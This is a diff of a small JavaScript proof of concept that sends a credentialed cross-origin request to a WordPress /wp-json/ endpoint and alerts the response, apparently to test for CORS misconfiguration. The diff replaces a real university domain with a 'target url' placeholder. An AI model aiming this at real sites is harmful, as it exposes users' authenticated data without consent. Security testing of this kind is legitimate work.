@@ -15,7 +15,7 @@ if (this.readyState == 4 && this.status == 200) {
 document.getElementById("demo").innerHTML = alert(this.responseText);
 }
 };
-xhttp.open("GET", "https://online.monash.edu/wp-json/", true);
+xhttp.open("GET", "https://<enter your target url here>/wp-json/", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
